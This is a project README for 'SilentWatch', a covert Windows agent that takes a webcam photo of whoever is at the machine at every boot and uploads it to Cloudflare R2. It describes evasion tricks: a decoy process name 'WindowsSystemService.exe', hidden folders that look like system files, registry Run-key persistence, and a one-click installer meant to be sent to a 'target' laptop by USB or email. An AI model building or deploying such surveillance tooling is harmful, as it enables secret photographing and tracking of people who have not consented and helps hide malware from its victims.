# 👁️ SilentWatch — Windows Startup Surveillance Agent

> A silent background agent that captures a webcam photo on every boot and uploads it to Cloudflare R2. Delivered as a one-click graphical installer — no Python, no terminal, no trace.

---

## 📋 Table of Contents

1. [Overview](#-overview)
2. [How It Works](#-how-it-works)
3. [File Structure](#-file-structure)
4. [Setup & Build](#-setup--build)
5. [Deploy to Target](#-deploy-to-target)

---

## 🔍 Overview

**SilentWatch** is a Windows-based startup surveillance tool that:

- Runs **silently and invisibly** on every boot — no window, no icon, no task bar entry
- **Captures a webcam photo** automatically after login
- **Uploads directly to Cloudflare R2** cloud storage
- **Works offline** — queues photos locally and uploads the moment internet returns
- **Self-installs** via a professional graphical installer — one double-click on any machine

Built with Python, PyInstaller, boto3, and OpenCV. No Python required on target machine.

---

## ⚙️ How It Works

```
Laptop boots
    ↓
Agent starts silently (via Windows Registry)
    ↓
Waits 30 seconds for system to settle
    ↓
Captures webcam photo
    ↓
Internet available? ──YES──▶ Upload to R2 ──▶ Exit
        │
        NO
        ▓
    Save to hidden local queue
    Check every 15 seconds
        ↓
    Internet back ──▶ Upload ──▶ Delete local ──▶ Exit
```

### Key Features

| Feature | Detail |
|---|---|
| 🔇 Silent startup | Registered via `HKCU\...\Run` registry key — no Startup folder needed |
| 📸 Smart capture | CAP_DSHOW driver, 10 warmup frames, tries camera index 0/1/2 |
| 🔄 Offline queue | Hidden temp folder `.msvcr_cache` — looks like a Windows system file |
| ☁️ Cloud upload | Direct to Cloudflare R2 via AWS S3 API (boto3) |
| 🔒 Single instance | Windows kernel32 PID check — no duplicate runs |
| 🎨 Wallpaper | Sets a custom desktop wallpaper silently during install |
| 📋 Logging | Full install log saved to `mk\log\installer_debug.log` |

---

## 📁 File Structure

```
SilentWatch/
│
├── 📄 agent.py                    ← Main background agent (source)
│   └── All logic: camera, R2 upload, offline queue, lock
│
├── 📄 deploy.py                   ← Graphical installer UI (source)
│   └── Windows-style setup wizard, progress bar, all install steps
│
├── 🔨 build.bat                   ← Builds agent.py → WindowsSystemService.exe
│   └── Auto-installs: opencv-python, boto3, botocore, pyinstaller
│
├── 🔨 build_installer.bat         ← Builds deploy.py → Setup.exe
│   └── Bundles WindowsSystemService.exe inside Setup.exe
│
├── 🗑️ uninstall.bat               ← Full clean removal
│   └── Removes: registry, EXE, queue, logs, Python packages
│
├── 🗑️ full_reset.bat              ← Kill + remove everything for fresh test
│
└── 📊 dashboard.html              ← Browser dashboard to view/manage R2 photos
    └── View photos, upload files, delete — no server needed
```

> After building, two additional files are generated:
> - `WindowsSystemService.exe` — standalone agent (output of `build.bat`)
> - `Setup.exe` — final deployable installer (output of `build_installer.bat`)

---

## 🔧 Setup & Build

### Requirements

- Windows 10/11
- Python 3.9+ installed with **"Add to PATH"** checked
- Internet connection (for pip installs)
- Cloudflare R2 account with bucket and API token

### Step 1 — Configure credentials

Open `agent.py` and fill in your R2 credentials at the top:

```python
R2_ACCOUNT_ID  = "your_account_id"
R2_ACCESS_KEY  = "your_access_key"
R2_SECRET_KEY  = "your_secret_key"
R2_BUCKET_NAME = "your_bucket_name"
R2_FOLDER      = "startup-photos"
```

### Step 2 — Build the agent EXE

```bat
build.bat
```

This will:
- Auto-install `opencv-python`, `boto3`, `botocore`, `pyinstaller`
- Bundle everything into `WindowsSystemService.exe`

### Step 3 — Build the installer

```bat
build_installer.bat
```

This will:
- Bundle `WindowsSystemService.exe` inside `Setup.exe`
- `Setup.exe` is your final deliverable — send this to any laptop

---

## 🚀 Deploy to Target

### What the target machine needs

```
Nothing. No Python. No installs. Just Setup.exe.
```

### Install steps on target laptop

```
1. Copy Setup.exe to the target machine (USB, share, email, etc.)
2. Double-click Setup.exe
3. Click Install in the graphical wizard
4. Done — restart laptop to verify
```

### What Setup.exe does silently

| Step | Action |
|---|---|
| 1 | Copies `WindowsSystemService.exe` to hidden folder |
| 2 | Hides the install folder (`attrib +h +s`) |
| 3 | Writes registry key for auto-start on every boot |
| 4 | Downloads wallpaper from R2 and sets as Desktop background |
| 5 | Shows green "Complete" screen |

### Verify it worked

After restarting the target laptop, check your Cloudflare R2 dashboard:

```
R2 → your-bucket → startup-photos → photo_YYYY-MM-DD_HH-MM-SS.jpg
```

Or open `dashboard.html` in any browser to view all photos.

---

## 🗑️ Uninstall

### From target laptop — run `uninstall.bat`

Removes:
- Registry startup entry
- Hidden EXE folder
- Local photo queue
- Agent logs and lock files
- Python packages (`opencv-python`, `boto3`, `pyinstaller`, etc.)

### Full reset for fresh testing — run `full_reset.bat`

Same as above but also kills any running agent process first.

---

## 📊 Dashboard

Open `dashboard.html` in any browser — no server needed.

Features:
- 📷 View all captured photos in a grid
- ⬆️ Upload any file directly to R2
- 🗑️ Delete photos or files
- 🔍 Search and sort by date or size
- 📥 Download individual photos

> **Requires CORS enabled on your R2 bucket:**
> `Settings → CORS Policy → Allow origins: * | Methods: GET, PUT, DELETE, HEAD`

---

## 🔐 Security Notes

- All R2 credentials are hardcoded in `agent.py` — do not commit to a public repository without removing them
- The agent runs under the current user account — no admin privileges required
- All files are hidden from Explorer — not visible to normal users
- Photos are deleted from local storage immediately after successful upload

---

## 📦 Tech Stack

| Component | Technology |
|---|---|
| Agent logic | Python 3, opencv-python, boto3 |
| Webcam capture | OpenCV CAP_DSHOW (Windows native driver) |
| Cloud storage | Cloudflare R2 (S3-compatible API) |
| EXE packaging | PyInstaller (onefile, noconsole) |
| Installer UI | Python tkinter |
| Auto-start | Windows Registry HKCU Run key |
| Dashboard | Vanilla HTML/JS, AWS Signature v4 |

---

*Built for Windows 10/11 · Python 3.9+*
